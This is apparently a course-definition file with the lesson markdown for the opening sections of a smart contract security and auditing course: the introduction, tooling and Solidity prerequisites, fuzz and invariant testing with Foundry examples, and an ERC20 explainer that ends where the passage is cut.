---
id: aca7cb85-ea1f-4fd3-9bc6-fc39f4609a0a
blueprint: course
title: 'Smart Contract Security and Auditing'
updated_at: 1714592337
github_url: 'https://github.com/Cyfrin/security-and-auditing-full-course-s23'
duration: 24
description: 'Start your career as a smart contract auditor! Learn the best practices for writing secure and optimized smart contracts. Explore techniques like fuzzing, invariant testing, formal verification, and more to identify bugs and protect web3 protocols.'
overview: 'Smart contracts invariant and fuzz testing, Stateless And Stateful Fuzzing Practice, Upgreadable smart contracts, smart contracts auditing, Aderyn, Slither, Manual review, Smart contracts testing'
preRequisites: |-
  Blockchain Basics
  Solidity fundamentals
  Foundry fundamentals
  Advanced Foundry
authors:
  - 8c756cc1-2d8a-41aa-9578-0ad4af9fbef3
  - c9c6811b-286b-4cb2-849f-696b2e913336
  - aa2226de-0946-4076-b9ea-8696988ce795
  - a65e7692-af03-4227-b3e2-a498ba75d6a4
  - e7e3a14e-f191-4809-8887-53337c25ee38
  - c6572203-4f7c-46d5-aa94-a4ba2716b0b1
  - a513d124-8b3f-495e-b3b6-a9ce0ae6b3ce
  - d4dcddd0-1a08-4e36-8609-473d07c70be2
  - ddbdec76-ed9c-4465-93a8-042acdb7e206
sections:
  -
    id: RhFDAz7A
    title: 'Course Introduction'
    slug: smart-contract-security-introduction
    lessons:
      -
        id: 5d21322f-ee36-4445-868f-cd39113e7e9b
        type: new_lesson
        enabled: true
        title: Trailer
        slug: trailer
        duration: 1
        video_url: j4JboXum46f3HSinGWmJcVRmxvrb2tjrvelQopMbl4E
        raw_markdown_url: /routes/security/0-introduction/1-trailer/+page.md
        markdown_content: |-
          ---
          title: Security Course Trailer
          ---

          _Follow along with this video_



          ---

          ---

          ## Ultimate Smart Contract Security, Assembly, and DeFi Curriculum

          ### Introduction

          **Welcome to the ultimate Smart Contract Security, Assembly, and DeFi Curriculum.** This course is designed to provide the most advanced and comprehensive training in EVM assembly, security auditing, and DeFi (Decentralized Finance).

          ### Course Overview

          - **Target Audience:** This course is tailored for individuals seeking deep insights and extensive knowledge in smart contract security, assembly language in EVM (Ethereum Virtual Machine), and decentralized finance applications.
          - **Course Structure:** The curriculum is structured to cover the intricacies of security auditing, the fundamentals and advanced concepts of EVM assembly, and critical aspects of DeFi.

          ### Objectives

          1. **Deep Understanding of Smart Contract Security:** Gain an in-depth knowledge of the security aspects vital for smart contracts in the blockchain ecosystem.
          2. **Proficiency in EVM Assembly:** Develop a solid understanding and hands-on experience with EVM assembly language, crucial for advanced blockchain development.
          3. **Mastery of DeFi Concepts:** Explore and master the concepts and applications of decentralized finance, an emerging and significant sector in the blockchain world.

          ### Expectations

          - **Commitment and Readiness:** The course demands a high level of commitment and is intended for individuals who are ready to dive deep into the complex world of blockchain technology.
          - **Advanced Level:** This is not an introductory course. It is expected that participants already have a foundational understanding of blockchain and programming concepts.

          ---

          **Are you ready to embark on this journey and expand your knowledge in smart contract security, EVM assembly, and DeFi?** Let's get started! üöÄ

          ---
      -
        id: f7a230be-cc9c-48d4-ba18-bc5b228fb249
        type: new_lesson
        enabled: true
        title: 'Welcome to smart contracts security'
        slug: welcome-smart-contracts-security
        duration: 5
        video_url: 7IwS00CgjQhzlsi6pyfGFY8bRLbG00WmACbjQhyF02zh7M
        raw_markdown_url: /routes/security/0-introduction/2-welcome/+page.md
        description: 'Explore the future of smart contract security in this course. Learn from experts and learn advanced smart contract auditing and research techniques.'
        markdown_content: |-
          ---
          title: Welcome to the ultimate Solidity Course
          ---

          _Follow along with this video_

          ---

          ## The Future of Web3: A focus on Security

          Welcome to the future of Web3 security; welcome to what is possibly the most comprehensive course on this subject ever created! As smart contract developers continue to bloom, it becomes imperative to ensure that the security scene keeps up. That‚Äôs the core focus of this guide - to level up the game and ensure a safer environment in the Web3 space.

          > _"Security is one of the most important things to unlocking the future of Web3."_

          With multiple detailed courses delivered in the past, dedicated to helping novice and intermediate smart contract developers enhance their skills. The accompanying study materials have garnered over 5.5 million views, making them the most-watched smart contract development courses on the planet. Thousands of budding developers have thus started their Web3 journey, equipped with the right knowledge and skills. They are now activated and productive developers in the Web3 space.

          This guide, however, is not for the newcomers. It's an advanced course aimed at those familiar with smart contracts and comfortable with terms like _storage_, _self-destruct_, _fallback functions_, and _ERC20s_. A refresher will be offered at the beginning, but the primary focus will be to provide learners with intensive training in smart contract auditing and research.

          ## Expert Opinions Matter

          It's always enriching to learn from the best, and this guide takes care of that too. Featuring guest lecturers who are renowned experts in smart contract development:

          1. Josselin from Trail of Bits
          2. Owen from Guardian Audience
          3. Andy from Sigma Prime
          4. Johnny Time from Gingersec
          5. Pashov, legendary security researcher.
          6. Hans, one of the top competitive auditors.
          7. Tincho, the former lead auditor at Openzeppelin.

          With these experts by your side, not only will you gain in-depth insights, but also get to explore extensive and carefully curated code samples. A special shout-out to Tincho, who has been actively supporting the development and auditing of the codes that will be discussed in detail.

          ## Mastering The Skills: Developer to Researcher

          People planning to take up this course should have a basic understanding of blockchain basics, solidity fundamentals, and working with a smart contract framework such as Hardhat or Foundry. We will primarily focus on Foundry in this guide, but the skills learned can easily be transferred to other frameworks as well.

          The course is not just for auditors; it is also aimed at training security researchers. Because who better to explore and learn about new attacks and analyze possible advances in smart contract technologies than a researcher?

          The [GitHub repo](https://github.com/Cyfrin/security-and-auditing-full-course-s23) associated with the course offers a detailed curriculum and additional resources. If you are already familiar with certain sections, feel free to skip directly to the ones that you need help with or wish to learn more about.

          ## A Peek into the Future

          We want you to learn effectively, and that's where Cyfrin Updraft comes into play. It's a tool developed to HyperCharge your learning experience and help you grasp things faster. It‚Äôs free to sign up for those interested.

          You are perfectly up to speed with the prerequisites if you have already taken the Foundry full course. Access more resources to get up to speed in the GitHub repo associated with the post.

          ## About the Author

          My name is Patrick Collins, and I am a smart contract developer, educator, security researcher, co-founder of Cyfrin Audits. As an absolute lover of Web3 and smart contract development, I believe that the ability to do fantastic things rests within this sphere. I delight in fueling driven individuals with the knowledge to become productive and start doing amazing things.

          Armed with unique insights from top competitive auditors like Hans, independent auditors like Pashov, and seasoned security veterans like Tincho, this blog endeavors to jump-start your security and auditing career. It encapsulates everything learned so far and aims to equip you with the right knowledge to become a positive force in the smart contract security auditing and safety space.

          Let's get Froggy. üê∏
      -
        id: 1e19c090-66e6-41ac-a4af-804f32a4c0ff
        type: new_lesson
        enabled: true
        title: Prerequisites
        slug: prerequisites
        duration: 3
        video_url: SZWWX8nzn1GMgAtt5Tml3y02mPLVI466Zpp5GDOaMrOA
        raw_markdown_url: /routes/security/0-introduction/3-prerequisites/+page.md
        description: "Find out what prerequisites are required for this course to ensure you're well-prepared for the upcoming lessons."
        markdown_content: |-
          ---
          title: Pre-requisites
          ---

          _Follow along with this video_



          ---

          ## Pre-requisites for the Smart Contract Security Course

          ### Introduction

          This course is **not** for beginners. We'll be covering advanced security and DeFi topics in this course and in order to get the most out of it you will _need_ to have a foundation to build upon.

          ### Necessary Background Knowledge

          1. **Blockchain Basics:** A fundamental understanding of blockchain technology is essential.
          2. **Solidity Fundamentals:** Proficiency in Solidity, the primary programming language for writing smart contracts.
          3. **Smart Contract Framework Experience:** Familiarity with a smart contract framework like Hardhat or Foundry is crucial, with a preference for Foundry, as it is the main tool used in this course.
          4. **Key Terms and Concepts:** Terms like storage, self-destruct, fallback functions, and ERC20s should be familiar.

          ### Course Expectations

          - **Level of Skill:** The course assumes a certain level of skill and will only provide a brief refresher at the beginning.
          - **For Auditors and Researchers:** If you have experience in security or auditing, this course will enhance your skills, focusing on not just auditing but also security research and building those skills and habits to make you successful in the space.

          ### Additional Resources

          - **Foundry Full Course:** Our Foundry Full Course will prepare you with all the skills you need to be successful here.
            - [Foundry Fundamentals](https://updraft.cyfrin.io/courses/foundry)
            - [Advanced Foundry](https://updraft.cyfrin.io/courses/advanced-foundry)
          - **GitHub Repository:** Additional resources to help get up to speed are available in the course's [GitHub repository](https://github.com/Cyfrin/security-and-auditing-full-course-s23).

          ### Course Philosophy and Goal

          - **Building a Strong Foundation:** The course aims to provide a solid base in smart contract security.
          - **Empowerment:** It focuses on empowering developers and researchers to contribute significantly to the Web3 space.
          - **Importance of Security:** Emphasizes the crucial role of security in the future of Web3.

          ---

          **Are you ready to build a strong foundation in smart contract security and contribute to the future of Web3?** Let's embark on this journey together!

          ---
      -
        id: bccddc5e-3f92-4f8f-9606-01566523e6a5
        type: new_lesson
        enabled: true
        title: 'Best Practices'
        slug: best-practices
        duration: 5
        video_url: S5VAXDa01KuOWZy02zhKWM4jwp02kldzp3Qjjk01IR9mwes
        raw_markdown_url: /routes/security/0-introduction/4-best-practices/+page.md
        description: 'Learn about best practices in Web 3.0 security to ensure safe and efficient smart contract development.'
        markdown_content: |-
          ---
          title: Best Practices
          ---

          _Follow along with this video_



          ---

          ## Best Practices

          Welcome to our Smart Contract Security course! I'm super excited to guide you through this journey. Let‚Äôs make sure you get the absolute best out of it.

          Essential Resources:

          - Cyfrin Updraft - If you're reading this, you're already here. All the most up to date corrections, content and updates will be available here, as accessible as ever and as part of a community eager to help.
          - GitHub Repo - The [Security and Auditing Full Course](https://github.com/Cyfrin/security-and-auditing-full-course-s23) repo is going to be your bible throughout this course. It is packed with all the code and references you need to succeed.

          Now, let's talk about how you can really get into the groove of things:

          - **Code Along**: Trust me, coding along with me during the lessons will make things stick way better. Have the video up along with your IDE of choice and follow along. Actually going through these motions are what will commit them to memory.
          - **Join the Chat on GitHub**: Got questions? Want to chat with others? Head over to our [GitHub Discussions](https://github.com/Cyfrin/security-and-auditing-full-course-s23/discussions) tab. It's a great spot to talk things out.
          - **Stay Up-to-Date**: Remember, the world of coding changes fast. Keep an eye on Cyfrin Updraft for the latest and greatest in course content.
          - **Dive into the Community** - We have a [Discord](https://discord.gg/cyfrin) server that is great for networking with fellow students and being involved in the community. Join us and share your successes and help others! To go far, we go together!

          About your learning pace ‚Äì everyone's different, right? So:

          - **Take Breaks**: They‚Äôre not just okay, they‚Äôre necessary! Your brain will thank you.
          - **Control the Tempo**: Feel free to speed up or slow down the videos. Video playback settings are available to control the pace.
          - **Keep Track of Your Journey**: Use those timestamps in our [GitHub repo](https://github.com/Cyfrin/security-and-auditing-full-course-s23) to bookmark your progress.
          - **Jump Around**: The course is set up so you can hop between sections as you like. Reflect on each lesson to really make it stick.

          And don‚Äôt forget, you‚Äôre not alone in this:

          - **Connect with the Community**: There are awesome places like [Ethereum Stack Exchange](https://ethereum.stackexchange.com/) and various decentralized Q&A forums, not to mention GitHub, for some solid discussion and collaboration.
          - **Learn Together**: The blockchain and smart contract space is all about teamwork and sharing knowledge. So, getting involved with others will only boost your learning.

          Alright, ready to jump in? Just follow these tips, and you'll be navigating through the Smart Contract Security course like a pro. Let‚Äôs get started! üöÄüë©‚Äçüíªüë®‚Äçüíª
      -
        id: 96c362b5-9aee-4a51-a686-de476257a351
        type: new_lesson
        enabled: true
        title: 'Current state of web3 security'
        slug: current-state-of-web3-security
        duration: 7
        video_url: uQc2m7WqBFujlEYutmhSLcgVBTm0201v8XUF02oyN7hAKY
        raw_markdown_url: /routes/security/0-introduction/5-current-state/+page.md
        description: 'Stay up-to-date with the current state of Web3 security and understand the challenges and advancements in this field.'
        markdown_content: |-
          ---
          title: The current state of web3 security
          ---

          _Follow along with this video_



          ---

          ## The Current State of Web3 Security: A Crucial Call to Action!

          The current state of Web3 security is pretty objectively terrible. Let's look at where we're at and what needs to be done to improve security in the industry.

          ### A Shocking Reality: Billions Lost in Hacks

          - **Billion-Dollar Troubles:** Did you know in 2022 alone, a jaw-dropping $3.1 billion was stolen in crypto hacks? And 2023 isn't looking much better. It's a call to arms for all of us in the Web3 space!
          - **DeFi's Dilemma:** Imagine this - about 7% of DeFi's total value is getting swiped by hackers. That's like saying, "Hey, deposit your money here, but there's a scary chance it might vanish!"

          ### Attack Patterns: The Usual Suspects

          **Top Threats:**

          - Price oracle manipulation
          - reward manipulation
          - stolen private keys

          These represent only a few of the common attack vectors we see lately. Some vulnerabilities have been around for years and _still_ people are making these mistakes - I'm looking at you _reentrancy_. There's a clear lack of best practices and we need to push back!

          There's an amazing newsletter, every serious security researcher should sign up for called [Block Threat Intelligence](https://newsletter.blockthreat.io/) by Peter Kacherginsky.

          Just recently (as of October, 2023), we've seen multi-million dollar hacks, just in the last couple months.

          ### The Big Picture: How do we move forward?

          - **Mainstream Hesitation:** With all these risks, no wonder big financial players are tiptoeing around Web3. It's incumbent upon us to make this space safer for mainstream adoption. How do we do accomplish this?
          - **Reducing the Risk:** It's simple - fewer hacks, more trust. More security focused education, fewer hacks.

          ### The Bright Side: The future of Web3 Security

          Security in Web3 is improving every day.

          1. More and more people are moving into the security space in Web3. More auditors, more experts, more...safe!
          2. Education is improving in Web3 Security and Web3 as a whole. People are more informed of best practices and what to watch out for
          3. Tooling is improving - with AI and constantly developments in static analysis and vulnerability aggregation - we've never been more equipped to improve security in the space. [Solodit](https://solodit.xyz/) in particular is a tool we'll come back to again and again in this course.

          **Protocols Playing It Safe:** More and more Web3 protocols are investing in security. They're auditing their code, they're opening bug bounties for post deployment coverage, they're finally realizing that spending $1 Million on security now, is worth saving $100 Million in being hacked.

          We also have an increase of pre-deployment experts like:

          - Cyfrin
          - Trail of Bits
          - OpenZeppelin

          Competitive audit platforms ([CodeHawks](https://www.codehawks.com/)), independent security researchers like ([Pashov](https://twitter.com/pashovkrum)) and a greater security focus all come together to make me optimistic about the future of Web3 Security.

          ### Yet, There's More to Do: Our Collective Mission

          - **Centralized Technology** is a big problem. Private keys being compromised, or offchain centralizing are regular vulnerabilities seen in the space.
          - **Lack of Post Deployment Practices** is something we'll cover later in the course. But needless to say, active monitoring practices and emergency triage in Web3 leave much to be desired. Few even leverage bug bounties to incentivize ongoing security on their protocol post launch.
          - **Not Following Best Practices**
          - **A Disconnect** seems to exist between the industry and security professionals. Audit(security review) != 100% Safe. If no one is reading the security reports, no one is any safer.

          ### Wrapping Up: Your Role in Shaping Web3's Destiny

          This isn't just a course. It's a mission. Together, we can transform Web3 into a fortress of trust and innovation. Keep going for some exercises to sharpen your skills.
      -
        id: 6407d102-4af4-439f-b6cf-571a615d14dd
        type: new_lesson
        enabled: true
        title: Exercises
        slug: exercises
        duration: 4
        video_url: 3CDs300T02oHqjuR1WnIP4vxSxqHDRt3f1chsH5BYNccw
        raw_markdown_url: /routes/security/0-introduction/6-exercises/+page.md
        description: 'Prepare for practical exercises that will help you apply your knowledge and skills gained throughout the course.'
        markdown_content: |-
          ---
          title: Exercises
          ---

          _Follow along with this video_



          ---

          ### Section 0: Excercises

          The first exercise is important. This is **just for you**. This isn't meant to be a motivation to share with others, or chat about publicly, this is what inspired you to take the first step and what will continue to inspire you to take the next.

          _This is for you._

          Make it as long and detailed as possible. Pour your emotion into defining why you want this. Don't bullsh\*t yourself. There'll be opportunities to shout your accomplishments loudly - but this is just for you.

          ---

          üéØ Exercise: `Write yourself a message about why you want this`

          This will be important for when things get hard
          Is it money? Save web3? Become someone?
          Write down as many reasons as possible.

          Section 0 NFT Challenge üëÄ

          [Welcome! (Arb)](https://arbiscan.io/address/0xf923431da74ecc873c4d641fbdfa2564baafca9f#code)

          [Welcome! (Sepolia)](https://sepolia.etherscan.io/address/0x39338138414df90ec67dc2ee046ab78bcd4f56d9)
    type: new_section
    enabled: true
  -
    id: euYvuMSm
    title: Review
    slug: review
    lessons:
      -
        id: 8a95ea78-0301-4dc3-814a-36699ab23b05
        type: new_lesson
        enabled: true
        title: 'Tooling Prerequisites'
        slug: tooling-requisites
        duration: 4
        video_url: u402E99ThbDHbSFBQiboYBRMzY992t3PA00yxf4qXuqf8
        raw_markdown_url: /routes/security/1-review/1-tooling-requisites/+page.md
        description: 'This lesson provides an overview of the essential tools required for Solidity and Smart Contract development. It includes a guide to text editors like Visual Studio Code and VSCodium, and an introduction to frameworks such as Foundry, alongside compatibility tips for different operating systems. It also highlights the importance of AI tools like Find and ChatGPT in the development process.'
        markdown_content: |-
          ---
          title: Tooling Pre-requisites
          ---

          _Follow along with this video_

          ---

          ## Pre-requisite Tools

          Before we get deep into coding, there are some useful tools we're going to be using throughout the course. Best to prepare them now.

          Firstly, you will need some kind of IDE or text editor. I like to use [**Visual Studio Code**](https://code.visualstudio.com/). For those of you more security and privacy focused you may want to check out [**VSCodium**](https://vscodium.com/) which removes a lot of the Microsoft _stuff_.

          ## Frameworks

          The primary framework we'll be working with in this course is Foundry. You can view installation instructions for that [**here**](https://book.getfoundry.sh/getting-started/installation).

          But hey, if you‚Äôre more familiar with [**Hardhat**](https://hardhat.org/), [**Brownie**](https://eth-brownie.readthedocs.io/en/stable/), or any other framework, don't stress; you can absolutely follow along using your tools. We'll be tackling some Foundry-specific tasks, but you're always welcome to adapt them for your framework of choice.

          > Remember: You can use commands `foundryup` to update your Foundry tools and `forge --help` to access a help guide.

          Additional Foundry specific features we'll be using include `cast` and `chisel`, both of which we'll learn more about in this course.

          ## Coding Environment

          If you're using a PC with Windows, ensure you're using **Windows with WSL**.

          This tool ensures the Linux terminal commands we run are compatible with your machine too. There's a brilliant [**guide by Vasiliy**](https://youtu.be/umepbfKp5rI?feature=shared&t=23546) walking you through the WSL installation process if you need it.

          For Linux and Mac users, you can simply stick with the environments you're already using.

          AI tools like [**Phind**](https://www.phind.com/) or [**ChatGPT**](https://www.chat.openai.com) aid in seeking answers when things get tough. One nifty feature **Phind** offers is web searching; you can query "_install Foundry for the ETH ecosystem_", and the tool will surf the web, compile an answer, and offer you a digestible solution for your query!

          <img src="/security-section-1/1-tooling/tooling1.PNG" style="width: 100%; height: auto;" alt="block fee">

          ## Web3 Is About Community

          I highly recommend you consider creating accounts on platforms like:

          - [**Peeranha.io**](https://peeranha.io/) - A great platform for discussion and QA for Web3
          - [**Ethereum Stack Exchange**](https://ethereum.stackexchange.com/) - One of _the_ best blockchain developer resources available
            and of course
          - [**GitHub**](https://www.github.com) - Every developer needs an account here. It's objectively the best space online to collaborate, discuss and share coding support.

          Remember to jump in and ask questions. Don't pretend to have answers when you don't. The learning experience is about being humble and is most rewarding to those willing to ask questions and seek clarity. Embrace the "I don't know, and I will find out" attitude.

          > One of the worst things you can do as a security researcher is pretend to know something you don't.
      -
        id: 10c4f125-eba0-41a7-bc7a-154842f2bc01
        type: new_lesson
        enabled: true
        title: 'Solidity Prerequisites'
        slug: solidity-requisites
        duration: 4
        video_url: iYZ4cd02KTxdyUG44SuIzZo1fah02ychPCr3qs4NUZOSg
        raw_markdown_url: /routes/security/1-review/2-solidity-requisites/+page.md
        description: 'Review the prerequisites for the Security and Auditing course, including skills like using Remix and Foundry.'
        markdown_content: |-
          ---
          title: Solidity Pre-requisites
          ---

          _Follow along with this video_

          ---

          Alright! All of the pre-requisites I've mentioned so far, and those mentioned here can be found in the Foundry Full Course ([Fundamentals](https://updraft.cyfrin.io/courses/foundry) _and_ [Advanced](https://updraft.cyfrin.io/courses/advanced-foundry))

          ## The Prerequisites: Solidity Basics

          To keep up with this course, you should be familiar with all the basic functions of [Remix](https://remix.ethereum.org). This includes `compiling`, and `deploying` to both local and testnet blockchains.

          All of the basic Solidity, variable types, contract structure etc should be second nature.

          ## Foundry Familiarity

          You should also be familiar with the working environments of Foundry, or your framework of choice. You should understand how to initialize a project in your framework and navigate it's working tree.

          <div style="text-align:center;">
          <img src="/security-section-1/2-solidity-req/solidity-prerequisites1.PNG" style="width: 40%; height: auto;" alt="block fee">
          </div>

          Commands like these should ring lots of bells.

          ```shell
          forge init
          forge build
          forge test
          ```

          The basic code seen in the Foundry example contracts should be things you recognize as well.

          ```js
          // SPDX-License-Identifier: UNLICENSED
          pragma solidity ^0.8.13;

          contract Counter {
              uint256 public number;

              function setNumber(uint256 newNumber) public {
                  number = newNumber;
              }

              function increment() public {
                  number++;
              }
          }
          ```

          ---

          ## Testing

          The Foundry example test setup contains two distinct test types, a regular test and a fuzz test. These distinctions you should be a little familiar with, but we'll definitely go more indepth throughout this course.

          ### Exploring Test Types: Regular Test and Fuzz Test

          In the regular test, we merely incept the counter contract and increment it, ensuring the counter number equals one. The Fuzz test, however, involves passing a random number into our test.

          As you may recall, we run this test with a certain number of runs, using different random numbers. No matter the chosen value for X, the test will always hold.

          How do we change the number of fuzz runs? Simply browse to Foundry's TOML file and copy the variable.

          ```md
          [fuzz]
          runs = 256
          max_test_rejects = 65536
          seed = "0x3e8"
          dictionary_weight = 40
          include_storage = true
          include_push_bytes = true
          ```

          In the TOML file, you have the ability to set the number of runs. For instance, we could change it from 256 to 600.

          ```shell
          $ forge test
          ```

          Voila! You'll see that the test Fuzz ran 600 times. This indicates that the test ran with 600 different random numbers.

          ```bash
          Running 1 test for test/Counter.t.sol:CounterTest
          [PASS] testFuzz_SetNumber(uint256) (runs: 600, Œº: 27398, ~: 28409)
          Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 14.63ms

          Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
          ```

          ## Advanced Fuzzing: Stateful Fuzzing and Invariant Tests

          On to the next level ‚Äì **stateful fuzzing**, also popular as invariant tests in the Foundry universe. This aspect of coding might not be your forte yet, but no worries, that's what we're here for.

          Let's look more closely at fuzzing and invariant testing in our next lesson.
      -
        id: 7ca092d5-a77c-4d01-b952-53d530f5a25e
        type: new_lesson
        enabled: true
        title: 'Fuzzing and invariants'
        slug: fuzzing-and-invariants
        duration: 10
        video_url: 4bjEKZNJ724C4jGzJHzDs1Q6Q4rLK7zUDbPhY8G0200pc
        raw_markdown_url: /routes/security/1-review/3-fuzzing-and-invariants/+page.md
        description: 'Explore the concepts of fuzz testing and invariant testing in Solidity. This lesson explains how fuzz testing can help uncover unexpected application failures, and dives into the practice of testing invariants, or properties that always hold true, in smart contracts.'
        markdown_content: |-
          ---
          title: Stateless Fuzzing, Stateful Fuzzing And Invariants/Properties
          ---

          _Follow along the video_

          ---

          ## Testing the Unknown

          Often, hacks result from scenarios you didn't anticipate or consider for testing. But what if you could write a test that checks for every possible scenario, not just one? Welcome to the world of **Fuzz testing**.

          ## What Is Fuzz Testing?

          Also known as _fuzzing_, this is all about supplying random data to your system in an attempt to break it. Imagine your code is an indestructible balloon. Fuzzing involves you doing random things (like poking, squeezing, or even kicking) to the balloon with the sole intention of breaking it.

          This makes it a useful technique for unearthing unexpected application failures. This lesson aims to walk you through the concept and practical application of fuzz testing.

          ### The Fundamental Principle: Testing Invariants

          Each system, from a function to an entire program, has an integral property, often referred to as the _invariant_. This property must always hold true. For instance, you could have a function called `doStuff` that should always return zero, regardless of the value of the input. In such a case, returning zero would be the invariant of that function.

          Let's dark dive deeper into what such a function could look like:

          ```js
          function doStuff(uint256 data) public {
              if (data == 2){
                  shouldAlwaysBeZero = 1;
              }
              if(hiddenValue == 7) {
                  shouldAlwaysBeZero = 1;
              }
              hiddenValue = data;
          }
          ```

          A unit test for this function would look something like this:

          ```js
          function testIsAlwaysGetZero() public {
              uint256 data = 0;
              exampleContract.doStuff(data);
              assert(exampleContract.shouldAlwaysBeZero() == 0);
          }
          ```

          The above test is going to pass because in that specific situation (where `data == 0`), our invariant isn't broken.

          From the function above, you can expect that `should_always_be_zero` is always zero, regardless of the `data` value. But wait, what happens if our input is `2`? We get `should_always_be_zero` as `1`. That violates our invariant!

          Of course, this is a pretty straightforward example. But what if we have a function that looks a bit more complicated? Writing a test case for every scenario could be tedious or impossible. We need to adopt a more programmatic approach to test these cases en masse.

          ## Introducing Fuzz Tests and Invariant Tests

          There are two popular methodologies when dealing with edge cases: using _fuzz tests/invariant tests_, or _symbolic execution_ (which we'll save for another day).

          > "Fuzz testing and Invariant testing are great tools to assess the robustness of your code."

          Let's consider an example of a fuzz test in Foundry. Here, we set our data right in the test parameter, allowing Foundry to automate the process of providing random input data during tests.

          ```js
          function testIsAlwaysGetZeroFuzz(uint256 data) public {
              exampleContract.doStuff(data);
              assert(exampleContract.shouldAlwaysBeZero() == 0);
          }
          ```

          Foundry will automatically randomize data and use numerous examples to run through the test script. This test will be supplied random data from 0 to uint256.max(), as many times as you've conifigured runs.

          > Reminder: You can configure the number of runs in your foundry.toml under the [fuzz] variable

          Notably, this pseudo-random mechanism is not exhaustive. It won't provide a scenario for every single possible data input. That's why further understanding of how the Fuzzer generates random data is crucial.

          ## Stateless Fuzzing versus Stateful Fuzzing

          Fuzzing also comes in flavours, the above being an example of `stateless fuzzing`. Another that is valuable to understand is `stateful fuzzing`. `Stateful fuzzing`, instead of resetting the contract state for each new run, will use the ending state of your previous run as the starting state of your next.

          This is important for situations like our `doStuff` function

          <img src="/security-section-1/3-fuzz-test/fuzz2.png" style="width: 100%; height: auto;" alt="block fee">

          A stateful fuzz test would instead utilize the same contract we just triggered and call another function on it, creating an interlocking sequence of functions throughout a single run. Achieving this in Foundry requires using the `invariant` keyword and a bit of setup:

          First, we need to import `StdInvariant` from `forge-std` and inherit it in our test contract.

          ```js
          //SPDX-License-Identifier: MIT
          pragma solidity ^0.8.0

          import {StdInvariant} from "forge-std/StdInvariant.sol";

          contract MyContractTest is StdInvariant, Test {...}
          ```

          Then, in the setup of our test contract, we need to tell Foundry, which contract we'll be calling random functions on.

          ```js
          function setUp() public {
              exampleContract = new MyContract();
              targetContract(address(exampleContract));
          }
          ```

          Now our `stateful fuzz` test is going to look something like this:

          ```js
          function invariant_testAlwaysReturnsZero() public {
              assert(exampleContract.shouldAlwaysBeZero() == 0);
          }
          ```

          With the above test, Foundry is going to call random functions on the `targetContract` (in our case `doStuff` repeatedly, but were there other functions, they would be called in a random order) and pass those functions random data.

          ## In Summary

          Fuzz testing involves mainly understanding your system's invariants and writing tests that can execute numerous scenarios. This is either achieved through `stateless fuzzing`, which provides random data alone with each run independent of the last, or `stateful fuzzing`, allowing both random data and random function calls subsequently on the same contract. This is the new standard for web3 security.

          Going forward, aim to fully understand the invariants in systems you're working on, and write fuzz tests to ensure they are not broken

          > "Fuzz testing is a technique that some of the top protocols are yet to adopt, yet it can aid in discovering high severity vulnerabilities in smart contracts." - Alex Rohn, co-founder at Cyfrin.

          Next lesson we're going to talk about common Ethereum Improvement Proposals (EIPs)!
      -
        id: 9d521d8e-81b8-4bc0-b446-07362440e116
        type: new_lesson
        enabled: true
        title: 'Installing Libraries'
        slug: installing-libraries
        duration: 3
        video_url: WcKJ201TiFW5Y1Yexh003HWfGO1g3hZYHrfOsDeb5owEg
        raw_markdown_url: /routes/security/1-review/4-installing-libraries/+page.md
        description: 'Learn to use OpenZeppelin for ERC20 token integration, including installation and contract creation. Insights into ERC-721 as well.'
        markdown_content: |-
          ---
          title: Installing Libraries
          ---

          _Follow along the with the video_

          ---

          We'll go over Fuzz and Invariant testing in more detail later. For now, let's briefly go over importing valuable libraries into our code base.

          ### OpenZeppelin Contracts and ERC20

          Say, you're working on a project and you'd like to include an `ERC20`, but are unsure where to start. This is where [OpenZeppelin Contracts](https://github.com/OpenZeppelin/openzeppelin-contracts) come into play. This popular library, available on GitHub, provides prewritten contracts for your use, making your life a whole lot easier!

          Use the following command to install this library to your project directory:

          ```shell
          forge install OpenZeppelin/openzeppelin-contracts --no-commit
          ```

          ### Configuring Project Files and Creating New Contracts

          Now, navigate to the `foundry.toml` file in your project directory. Here, specify the remappings by setting `@openzeppelin/contracts` equal to `lib/openzeppelin-contracts/contracts`. This sets up the path for the compiler to locate OpenZeppelin contracts.

          ```markdown
          remappings = ['@openzeppelin/contracts=lib/openzeppelin-contracts/contracts']
          ```

          Once remapped, the library and it's contracts can be imported into your project like so:

          ```js
          //SPDX-License-Identifier: MIT
          pragma solidity ^0.8.13;

          import {ERC20} from '@openzeppelin/contracts/token/ERC20/ERC20.sol';

          contract MyToken is ERC20 {
              constructor() ERC20("MyTokenName","MTN") {};
          }
          ```

          For those who might need a brush up on what exactly ERC20 is or are curious about other types of tokens like the ERC721 (also known as NFTs), stay tuned as we'll be covering them in our upcoming discussions.
      -
        id: 0f2eefd6-73c5-4991-ac1b-2fd319840ed5
        type: new_lesson
        enabled: true
        title: 'What is an ERC20?'
        slug: what-is-erc20
        duration: 2
        video_url: 00SC46ZIyrWRIJCiZZ02D45MT9z701pENw6V6L1hnyYbf00
        raw_markdown_url: /routes/security/1-review/5-what-is-erc20/+page.md
        description: 'introduction to ERC-20 tokens, their functionality, and applications. Learn ERC-20 basics like token creation and use cases.'
        markdown_content: |-
          ---
          title: What is an ERC20/EIP20?
          ---

          _Follow along the with the video_

          ---

          ## What are ERC20 tokens?

          Firstly, let's define what ERC20s are. ERC20s are tokens that exist and function on a blockchain network using a predefined standard called [the ERC20 token standard](https://ethereum.org/en/developers/docs/standards/tokens/ERC20/). This standard is essentially a set of rules that dictate certain functions a token should have, allowing it to interact seamlessly with other tokens on the network.

          However, the magic doesn't just stop at being tokens. ERC20s are also smart contracts. This hybrid nature allows ERC20 tokens to embody complex functionalities on the blockchain. Isn't that cool? A few notable examples of ERC20s include tokens like Tether, Chainlink, Uni and DAI.

          > **Note:**Chainlink technically falls under the ERC-677 standard, a higher standard that introduces additional functions while still retaining compatibility with the original ERC20 standard. So, you can think of Chainlink as an upgraded ERC20 token.

          ## Why care about ERC20 tokens?

          At this point, you might be wondering, "Why should I even care to make an ERC20 token?". Well, there are a number of compelling reasons.

          ERC20 tokens find extensive use in a number of areas. They can serve as governance tokens, allowing token holders to vote on various matters within a DApp (Decentralised Application). They can be used to secure the underlying network. They can also represent some type of static asset, and much more. The sky's the limit when it comes to what you can achieve with ERC20 tokens.

          ## How to create an ERC20 token

          Now that we've addressed the 'what' and 'why' of ERC20 tokens, let's delve into the 'how'. You can create your very own ERC20 token by crafting a smart contract that conforms to the ERC20 token standard.

